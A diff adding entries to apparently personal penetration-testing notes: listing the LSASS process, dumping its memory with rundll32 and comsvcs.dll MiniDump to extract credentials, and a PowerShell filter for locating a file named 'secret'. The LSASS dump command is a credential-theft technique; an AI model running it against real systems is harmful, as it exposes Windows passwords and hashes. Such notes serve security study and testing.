@@ -71,3 +71,25 @@ Patching
 ```powershell
 get-hotfix
 ```
+
+
+#### Finding LSASS PID in PowerShell
+```powershell
+PS C:\Windows\system32> Get-Process lsass
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1260      21     4948      15396       2.56    672   0 lsass
+```
+
+#### Create LSASS.dmp 
+[[Password Attacks]] [[Attack LSASS]]
+```powershell
+PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+```
+
+### Recursive Search for a Specific File(Powershell)
+[[Basics]] [[SMB]] 
+```powershell
+{ !$PsIsContainer -and [System.IO.Path]::GetFileNameWithoutExtension($_.Name) -eq "secret" }
+```
